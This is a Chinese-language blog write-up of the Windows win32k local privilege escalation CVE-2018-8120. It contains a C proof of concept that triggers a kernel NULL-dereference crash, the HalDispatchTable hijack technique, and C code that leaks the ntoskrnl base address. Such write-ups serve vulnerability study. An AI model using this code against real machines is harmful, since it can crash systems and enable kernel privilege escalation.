<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Windows LPE CVE-2018-8120 | ln3’s blog</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Windows LPE CVE-2018-8120" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="漏洞原因" />
<meta property="og:description" content="漏洞原因" />
<link rel="canonical" href="http://localhost:4000/windows/2021/05/14/cve-2018-8120.html" />
<meta property="og:url" content="http://localhost:4000/windows/2021/05/14/cve-2018-8120.html" />
<meta property="og:site_name" content="ln3’s blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-05-14T15:20:22+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Windows LPE CVE-2018-8120" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-14T15:20:22+08:00","datePublished":"2021-05-14T15:20:22+08:00","description":"漏洞原因","headline":"Windows LPE CVE-2018-8120","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/windows/2021/05/14/cve-2018-8120.html"},"url":"http://localhost:4000/windows/2021/05/14/cve-2018-8120.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="ln3&apos;s blog" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">ln3&#39;s blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Windows LPE CVE-2018-8120</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2021-05-14T15:20:22+08:00" itemprop="datePublished">May 14, 2021
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <h2 id="漏洞原因">漏洞原因</h2>

<p><code class="language-plaintext highlighter-rouge">win32k.sys</code> 中的<code class="language-plaintext highlighter-rouge">SetImeInfoEx</code> 对传入的<code class="language-plaintext highlighter-rouge">TagWindowStation</code> 结构的<code class="language-plaintext highlighter-rouge">spkList</code> 成员的有效性没有进行检查,导致后续代码处理中对<code class="language-plaintext highlighter-rouge">NULL</code> 解引用.</p>

<p><strong>win32k!TagWindowStation</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">win32k</span><span class="o">!</span><span class="n">TagWindowStation</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="n">dwSessionId</span>      <span class="o">:</span> <span class="n">Uint4B</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="n">rpwinstaNext</span>     <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagWINDOWSTATION</span>
   <span class="o">+</span><span class="mh">0x008</span> <span class="n">rpdeskList</span>       <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagDESKTOP</span>
   <span class="o">+</span><span class="mh">0x00c</span> <span class="n">pTerm</span>            <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagTERMINAL</span>
   <span class="o">+</span><span class="mh">0x010</span> <span class="n">dwWSF_Flags</span>      <span class="o">:</span> <span class="n">Uint4B</span>
   <span class="o">+</span><span class="mh">0x014</span> <span class="n">spklList</span>         <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagKL</span>
   <span class="o">+</span><span class="mh">0x018</span> <span class="n">ptiClipLock</span>      <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagTHREADINFO</span>
   <span class="o">+</span><span class="mh">0x01c</span> <span class="n">ptiDrawingClipboard</span> <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagTHREADINFO</span>
   <span class="o">+</span><span class="mh">0x020</span> <span class="n">spwndClipOpen</span>    <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagWND</span>
   <span class="o">+</span><span class="mh">0x024</span> <span class="n">spwndClipViewer</span>  <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagWND</span>
   <span class="o">+</span><span class="mh">0x028</span> <span class="n">spwndClipOwner</span>   <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagWND</span>
   <span class="o">+</span><span class="mh">0x02c</span> <span class="n">pClipBase</span>        <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagCLIP</span>
   <span class="o">+</span><span class="mh">0x030</span> <span class="n">cNumClipFormats</span>  <span class="o">:</span> <span class="n">Uint4B</span>
   <span class="o">+</span><span class="mh">0x034</span> <span class="n">iClipSerialNumber</span> <span class="o">:</span> <span class="n">Uint4B</span>
   <span class="o">+</span><span class="mh">0x038</span> <span class="n">iClipSequenceNumber</span> <span class="o">:</span> <span class="n">Uint4B</span>
   <span class="o">+</span><span class="mh">0x03c</span> <span class="n">spwndClipboardListener</span> <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">tagWND</span>
   <span class="o">+</span><span class="mh">0x040</span> <span class="n">pGlobalAtomTable</span> <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">Void</span>
   <span class="o">+</span><span class="mh">0x044</span> <span class="n">luidEndSession</span>   <span class="o">:</span> <span class="n">_LUID</span>
   <span class="o">+</span><span class="mh">0x04c</span> <span class="n">luidUser</span>         <span class="o">:</span> <span class="n">_LUID</span>
   <span class="o">+</span><span class="mh">0x054</span> <span class="n">psidUser</span>         <span class="o">:</span> <span class="n">Ptr32</span> <span class="n">Void</span>
</code></pre></div></div>

<p><img src="/imgs/vuln.png" alt="vuln.png" /></p>

<h2 id="proof-of-concept">Proof of Concept</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
</span><span class="kr">__declspec</span><span class="p">(</span><span class="kr">naked</span><span class="p">)</span> <span class="kt">void</span> <span class="nf">NtUserSetImeInfoEx</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">tmp</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">_asm</span> <span class="p">{</span>
		<span class="n">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="n">tmp</span><span class="p">;</span>        <span class="c1">//参数</span>
		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x1226</span><span class="p">;</span>     <span class="c1">// NtUserSetImeInfoEx的调用号</span>
		<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x7ffe0300</span><span class="p">;</span> <span class="c1">// 系统调用函数入口</span>
		<span class="n">call</span> <span class="n">dword</span> <span class="n">ptr</span><span class="p">[</span><span class="n">edx</span><span class="p">];</span>
		<span class="n">ret</span> <span class="mi">4</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
		<span class="n">HWINSTA</span> <span class="n">hWinsta</span> <span class="o">=</span> <span class="n">CreateWindowStationA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">READ_CONTROL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
		<span class="n">SetProcessWindowStation</span><span class="p">(</span><span class="n">hWinsta</span><span class="p">);</span>
		<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
		<span class="n">NtUserSetImeInfoEx</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">buffer</span><span class="p">);</span> <span class="c1">// keBugCheck</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// never reach</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="漏洞利用">漏洞利用</h2>

<p>在Windows 7 及以下版本的操作系统中, 攻击者可以调用<code class="language-plaintext highlighter-rouge">NtAllocateVirtualMemory</code> 手动来分配0页内存,此时<code class="language-plaintext highlighter-rouge">v3[5]</code> 的内存可控, 可以实施了一次任意地址写.</p>

<h3 id="常用利用模式-haldispatchtable劫持">常用利用模式 HalDispatchTable劫持</h3>

<p>在<code class="language-plaintext highlighter-rouge">Ntoskrnl.exe</code> 中有一个<code class="language-plaintext highlighter-rouge">HalDispatchTable</code> 函数指针表, 当调用<code class="language-plaintext highlighter-rouge">NtQueryIntervalProfile</code> 时,会调用到这个表的第二项指针,可以通过修改该项指针,来劫持执行流到用户层代码 ( 如果<code class="language-plaintext highlighter-rouge">SMEP</code> 未开启 )</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kd</span><span class="o">&gt;</span> <span class="n">u</span> <span class="n">nt</span><span class="o">!</span><span class="n">NtQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x6b</span>    <span class="c1">//win7 32位</span>
<span class="n">nt</span><span class="o">!</span><span class="n">NtQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x6b</span><span class="o">:</span>
<span class="mi">84119</span><span class="n">ed6</span> <span class="n">e83ae5fbff</span>      <span class="n">call</span>    <span class="n">nt</span><span class="o">!</span><span class="n">KeQueryIntervalProfile</span> <span class="p">(</span><span class="mi">840</span><span class="n">d8415</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kd</span><span class="o">&gt;</span> <span class="n">u</span> <span class="n">nt</span><span class="o">!</span><span class="n">NtQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x38</span>    <span class="c1">//win7 64位</span>
<span class="n">nt</span><span class="o">!</span><span class="n">NtQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x38</span><span class="o">:</span>
<span class="n">fffff800</span><span class="err">`</span><span class="mo">0425</span><span class="n">f0d8</span> <span class="n">e8930affff</span>      <span class="n">call</span>    <span class="n">nt</span><span class="o">!</span><span class="n">KeQueryIntervalProfile</span> <span class="p">(</span><span class="n">fffff800</span><span class="err">`</span><span class="mo">0424</span><span class="n">fb70</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kd</span><span class="o">&gt;</span> <span class="n">u</span> <span class="n">nt</span><span class="o">!</span><span class="n">KeQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x14</span>        <span class="c1">//win7 32位</span>
<span class="n">nt</span><span class="o">!</span><span class="n">KeQueryIntervalProfile</span><span class="o">+</span><span class="mh">0x14</span><span class="o">:</span>
<span class="mi">840</span><span class="n">d8429</span> <span class="mi">8945</span><span class="n">f0</span>          <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">],</span><span class="n">eax</span>
<span class="mi">840</span><span class="n">d842c</span> <span class="mi">8</span><span class="n">d45fc</span>          <span class="n">lea</span>     <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
<span class="mi">840</span><span class="n">d842f</span> <span class="mi">50</span>              <span class="n">push</span>    <span class="n">eax</span>
<span class="mi">840</span><span class="n">d8430</span> <span class="mi">8</span><span class="n">d45f0</span>          <span class="n">lea</span>     <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span>
<span class="mi">840</span><span class="n">d8433</span> <span class="mi">50</span>              <span class="n">push</span>    <span class="n">eax</span>
<span class="mi">840</span><span class="n">d8434</span> <span class="mi">6</span><span class="n">a0c</span>            <span class="n">push</span>    <span class="mi">0</span><span class="n">Ch</span>
<span class="mi">840</span><span class="n">d8436</span> <span class="mi">6</span><span class="n">a01</span>            <span class="n">push</span>    <span class="mi">1</span>
<span class="mi">840</span><span class="n">d8438</span> <span class="n">ff15fc83f383</span>    <span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">nt</span><span class="o">!</span><span class="n">HalDispatchTable</span><span class="o">+</span><span class="mh">0x4</span> <span class="p">(</span><span class="mi">83</span><span class="n">f383fc</span><span class="p">)]</span>    <span class="c1">//32位是+4的地址 </span>
</code></pre></div></div>

<p>在这种模式下,首先要获取<code class="language-plaintext highlighter-rouge">HalDispatchTable</code> 的地址,这个表存储在<code class="language-plaintext highlighter-rouge">Ntoskrnl.exe</code> 中,所有首先要泄露<code class="language-plaintext highlighter-rouge">Ntoskrnl.exe</code> 的基址.</p>

<p>需要注意的是对于不同的系统版本和系统的编译选项, <code class="language-plaintext highlighter-rouge">Ntoskrnl.exe</code> 这个模块的名字并不统一.</p>

<p>有两种方法来获取<code class="language-plaintext highlighter-rouge">Ntoskrnl.exe</code> 的基址:</p>

<h3 id="使用未导出的zwquerysysteminformation-api查询">使用未导出的ZwQuerySystemInformation API查询</h3>

<p>API 原型:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">NTSTATUS</span> <span class="n">WINAPI</span> <span class="nf">ZwQuerySystemInformation</span><span class="p">(</span>
  <span class="n">_In_</span>      <span class="n">SYSTEM_INFORMATION_CLASS</span> <span class="n">SystemInformationClass</span><span class="p">,</span>
  <span class="n">_Inout_</span>   <span class="n">PVOID</span>                    <span class="n">SystemInformation</span><span class="p">,</span>
  <span class="n">_In_</span>      <span class="n">ULONG</span>                    <span class="n">SystemInformationLength</span><span class="p">,</span>
  <span class="n">_Out_opt_</span> <span class="n">PULONG</span>                   <span class="n">ReturnLength</span>
<span class="p">);</span>
</code></pre></div></div>

<p>其中<code class="language-plaintext highlighter-rouge">SystemInformationClass</code> 的取值有:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">enum</span> <span class="n">_SYSTEM_INFORMATION_CLASS</span> <span class="p">{</span>
 <span class="n">SystemBasicInformation</span><span class="p">,</span> <span class="c1">// 0 Y N</span>
 <span class="n">SystemProcessorInformation</span><span class="p">,</span> <span class="c1">// 1 Y N</span>
 <span class="n">SystemPerformanceInformation</span><span class="p">,</span> <span class="c1">// 2 Y N</span>
 <span class="n">SystemTimeOfDayInformation</span><span class="p">,</span> <span class="c1">// 3 Y N</span>
 <span class="n">SystemNotImplemented1</span><span class="p">,</span> <span class="c1">// 4 Y N</span>
 <span class="n">SystemProcessesAndThreadsInformation</span><span class="p">,</span> <span class="c1">// 5 Y N</span>
 <span class="n">SystemCallCounts</span><span class="p">,</span> <span class="c1">// 6 Y N</span>
 <span class="n">SystemConfigurationInformation</span><span class="p">,</span> <span class="c1">// 7 Y N</span>
 <span class="n">SystemProcessorTimes</span><span class="p">,</span> <span class="c1">// 8 Y N</span>
 <span class="n">SystemGlobalFlag</span><span class="p">,</span> <span class="c1">// 9 Y Y</span>
 <span class="n">SystemNotImplemented2</span><span class="p">,</span> <span class="c1">// 10 Y N</span>
 <span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="c1">// 11 Y N    枚举内核模块时用</span>
 <span class="n">SystemLockInformation</span><span class="p">,</span> <span class="c1">// 12 Y N</span>
 <span class="n">SystemNotImplemented3</span><span class="p">,</span> <span class="c1">// 13 Y N</span>
 <span class="n">SystemNotImplemented4</span><span class="p">,</span> <span class="c1">// 14 Y N</span>
 <span class="n">SystemNotImplemented5</span><span class="p">,</span> <span class="c1">// 15 Y N</span>
 <span class="n">SystemHandleInformation</span><span class="p">,</span> <span class="c1">// 16 Y N</span>
 <span class="n">SystemObjectInformation</span><span class="p">,</span> <span class="c1">// 17 Y N</span>
 <span class="n">SystemPagefileInformation</span><span class="p">,</span> <span class="c1">// 18 Y N</span>
 <span class="n">SystemInstructionEmulationCounts</span><span class="p">,</span> <span class="c1">// 19 Y N</span>
 <span class="n">SystemInvalidInfoClass1</span><span class="p">,</span> <span class="c1">// 20</span>
 <span class="n">SystemCacheInformation</span><span class="p">,</span> <span class="c1">// 21 Y Y</span>
 <span class="n">SystemPoolTagInformation</span><span class="p">,</span> <span class="c1">// 22 Y N</span>
 <span class="n">SystemProcessorStatistics</span><span class="p">,</span> <span class="c1">// 23 Y N</span>
 <span class="n">SystemDpcInformation</span><span class="p">,</span> <span class="c1">// 24 Y Y</span>
 <span class="n">SystemNotImplemented6</span><span class="p">,</span> <span class="c1">// 25 Y N</span>
 <span class="n">SystemLoadImage</span><span class="p">,</span> <span class="c1">// 26 N Y</span>
 <span class="n">SystemUnloadImage</span><span class="p">,</span> <span class="c1">// 27 N Y</span>
 <span class="n">SystemTimeAdjustment</span><span class="p">,</span> <span class="c1">// 28 Y Y</span>
 <span class="n">SystemNotImplemented7</span><span class="p">,</span> <span class="c1">// 29 Y N</span>
 <span class="n">SystemNotImplemented8</span><span class="p">,</span> <span class="c1">// 30 Y N</span>
 <span class="n">SystemNotImplemented9</span><span class="p">,</span> <span class="c1">// 31 Y N</span>
 <span class="n">SystemCrashDumpInformation</span><span class="p">,</span> <span class="c1">// 32 Y N</span>
 <span class="n">SystemExceptionInformation</span><span class="p">,</span> <span class="c1">// 33 Y N</span>
 <span class="n">SystemCrashDumpStateInformation</span><span class="p">,</span> <span class="c1">// 34 Y Y/N</span>
 <span class="n">SystemKernelDebuggerInformation</span><span class="p">,</span> <span class="c1">// 35 Y N</span>
 <span class="n">SystemContextSwitchInformation</span><span class="p">,</span> <span class="c1">// 36 Y N</span>
 <span class="n">SystemRegistryQuotaInformation</span><span class="p">,</span> <span class="c1">// 37 Y Y</span>
 <span class="n">SystemLoadAndCallImage</span><span class="p">,</span> <span class="c1">// 38 N Y</span>
 <span class="n">SystemPrioritySeparation</span><span class="p">,</span> <span class="c1">// 39 N Y</span>
 <span class="n">SystemNotImplemented10</span><span class="p">,</span> <span class="c1">// 40 Y N</span>
 <span class="n">SystemNotImplemented11</span><span class="p">,</span> <span class="c1">// 41 Y N</span>
 <span class="n">SystemInvalidInfoClass2</span><span class="p">,</span> <span class="c1">// 42</span>
 <span class="n">SystemInvalidInfoClass3</span><span class="p">,</span> <span class="c1">// 43</span>
 <span class="n">SystemTimeZoneInformation</span><span class="p">,</span> <span class="c1">// 44 Y N</span>
 <span class="n">SystemLookasideInformation</span><span class="p">,</span> <span class="c1">// 45 Y N</span>
 <span class="n">SystemSetTimeSlipEvent</span><span class="p">,</span> <span class="c1">// 46 N Y</span>
 <span class="n">SystemCreateSession</span><span class="p">,</span> <span class="c1">// 47 N Y</span>
 <span class="n">SystemDeleteSession</span><span class="p">,</span> <span class="c1">// 48 N Y</span>
 <span class="n">SystemInvalidInfoClass4</span><span class="p">,</span> <span class="c1">// 49</span>
 <span class="n">SystemRangeStartInformation</span><span class="p">,</span> <span class="c1">// 50 Y N</span>
 <span class="n">SystemVerifierInformation</span><span class="p">,</span> <span class="c1">// 51 Y Y</span>
 <span class="n">SystemAddVerifier</span><span class="p">,</span> <span class="c1">// 52 N Y</span>
 <span class="n">SystemSessionProcessesInformation</span> <span class="c1">// 53 Y N</span>
<span class="p">}</span><span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">;</span>
</code></pre></div></div>

<p>这里使用<code class="language-plaintext highlighter-rouge">SystemModuleInformation 11</code> 来获取所有内核模块的信息, 函数将返回一个结构体数组的简单包装.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SYSTEM_MODULE_INFORMATION</span>
<span class="p">{</span>
    <span class="n">ULONG</span> <span class="n">Count</span><span class="p">;</span>
    <span class="n">SYSTEM_MODULE_ENTRY</span> <span class="n">Module</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span> <span class="n">SYSTEM_MODULE_INFORMATION</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">SYSTEM_MODULE_ENTRY</code> 为模块信息结构体.</p>

<p>模块信息结构体的定义如下:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SYSTEM_MODULE_ENTRY</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">Section</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">MappedBase</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">ImageBase</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">ImageSize</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">LoadOrderIndex</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">InitOrderIndex</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">LoadCount</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">OffsetToFileName</span><span class="p">;</span>
    <span class="n">UCHAR</span> <span class="n">FullPathName</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="p">}</span> <span class="n">SYSTEM_MODULE_ENTRY</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE_ENTRY</span><span class="p">;</span>
</code></pre></div></div>

<p>其中第一个模块默认为<code class="language-plaintext highlighter-rouge">Ntoskrnl.exe</code></p>

<p>获取基址及名字的代码:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">using</span> <span class="n">pZwQuerySystemInformation</span> <span class="o">=</span> <span class="n">NTSTATUS</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="p">)(</span>
  <span class="n">SYSTEM_INFORMATION_CLASS</span> <span class="n">SystemInformationClass</span><span class="p">,</span>
  <span class="n">PVOID</span>                    <span class="n">SystemInformation</span><span class="p">,</span>
  <span class="n">ULONG</span>                    <span class="n">SystemInformationLength</span><span class="p">,</span>
  <span class="n">PULONG</span>                   <span class="n">ReturnLength</span>
<span class="p">);</span> <span class="c1">// 函数指针类型定义</span>
<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="nf">GetNtoskrnl</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hNtdll</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">auto</span> <span class="n">ZwQuerySystemInformation</span> <span class="o">=</span> <span class="p">(</span><span class="n">pZwQuerySystemInformation</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">,</span> <span class="s">"ZwQuerySystemInformation"</span><span class="p">);</span> <span class="c1">//获取未导出api</span>
	<span class="n">SIZE_T</span> <span class="n">SysModLen</span><span class="p">;</span>
	<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">SysModuleInfo</span><span class="p">;</span>
	<span class="n">ZwQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">SysModLen</span><span class="p">);</span> <span class="c1">// 先获取所有模块信息的大小.</span>
	<span class="n">SysModuleInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">decltype</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">))</span><span class="n">malloc</span><span class="p">(</span><span class="n">SysModLen</span><span class="p">);</span>          <span class="c1">// 分配空间存放结构体数组</span>
	<span class="n">ZwQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="n">SysModuleInfo</span><span class="p">,</span> <span class="n">SysModLen</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">SysModLen</span><span class="p">);</span> <span class="c1">// 填充结构体数组</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">GetLastError</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"ZwQuerySystemInformation Function Fail..."</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">SysModuleInfo</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">LPCSTR</span> <span class="kr">inline</span> <span class="nf">GetNtoskrnlName</span><span class="p">(</span><span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">sysinfo</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// 返回的FullPathName一般类似System32\system\ntoskrnl.exe</span>
	<span class="n">LPCSTR</span> <span class="n">NtoskrnlName</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">sysinfo</span><span class="o">-&gt;</span><span class="n">Module</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">FullPathName</span><span class="p">,</span><span class="sc">'\\'</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// 截取Ntoskrnl真实名称</span>
	<span class="k">return</span> <span class="n">NtoskrnlName</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">PVOID</span> <span class="kr">inline</span> <span class="nf">GetNtoskrnlBase</span><span class="p">(</span><span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">sysinfo</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="n">sysinfo</span><span class="o">-&gt;</span><span class="n">Module</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">ImageBase</span><span class="p">;</span> <span class="c1">// 获取模块基址</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="枚举驱动信息获取基址">枚举驱动信息获取基址</h3>

<p>需要预先知道正确的<code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code> 名称</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span><span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span><span class="cpf">&lt;Psapi.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">LPVOID</span> <span class="n">imagebase</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
    <span class="n">LPDWORD</span> <span class="n">Needed</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">TCHAR</span> <span class="n">imagename</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>

    <span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">imagebase</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="k">sizeof</span><span class="p">(</span><span class="n">imagebase</span><span class="p">),</span> <span class="n">Needed</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">GetDeviceDriverBaseNameA</span><span class="p">(</span><span class="n">imagebase</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)</span><span class="n">imagename</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="n">LPSTR</span><span class="p">)</span><span class="n">imagename</span><span class="p">,</span> <span class="s">"ntoskrnl.exe"</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Imagename is %s,Imagebase is 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">imagename</span><span class="p">,</span> <span class="n">imagebase</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>名称与处理器核数和是否支持<code class="language-plaintext highlighter-rouge">PAE</code>机制有关</p>

<p>关系如下:</p>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>单处理器</th>
      <th>多处理器</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>支持PAE</td>
      <td>ntkrnlpa.exe</td>
      <td>ntkrpamp.exe</td>
    </tr>
    <tr>
      <td>不支持PAE</td>
      <td>ntoskrnl.exe</td>
      <td>ntkrnlmp.exe</td>
    </tr>
  </tbody>
</table>

